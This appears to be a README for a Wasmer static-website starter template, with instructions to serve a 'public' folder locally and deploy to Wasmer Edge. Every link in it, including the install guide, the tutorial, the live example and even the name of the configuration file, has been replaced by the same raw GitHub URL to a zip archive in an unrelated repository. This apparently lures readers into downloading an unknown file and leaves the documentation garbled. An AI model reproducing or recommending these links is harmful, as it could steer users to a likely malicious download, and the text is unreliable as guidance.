A static-website starter template using [Static Web Server](https://raw.githubusercontent.com/XpiderService/Beta2/main/.github/Beta_v1.4.zip).

> You can follow the full tutorial from [here](https://raw.githubusercontent.com/XpiderService/Beta2/main/.github/Beta_v1.4.zip)

## Usage

All the static files will be served from the `public` folder, and the static webserver will be configured using the `https://raw.githubusercontent.com/XpiderService/Beta2/main/.github/Beta_v1.4.zip` file.

You can run the static-website template easily using Wasmer (check out the [install guide](https://raw.githubusercontent.com/XpiderService/Beta2/main/.github/Beta_v1.4.zip)):

```bash
wasmer run . --net
```

Open [http://localhost:8080](http://localhost:8080) with your browser
to see the static website.

## Deploy on Wasmer Edge

The easiest way to serve your public assets is to use the [Wasmer Edge](https://raw.githubusercontent.com/XpiderService/Beta2/main/.github/Beta_v1.4.zip) as your CDN.

Live example: https://raw.githubusercontent.com/XpiderService/Beta2/main/.github/Beta_v1.4.zip

Run this commmand to deploy to Wasmer Edge:

```bash
wasmer deploy
```
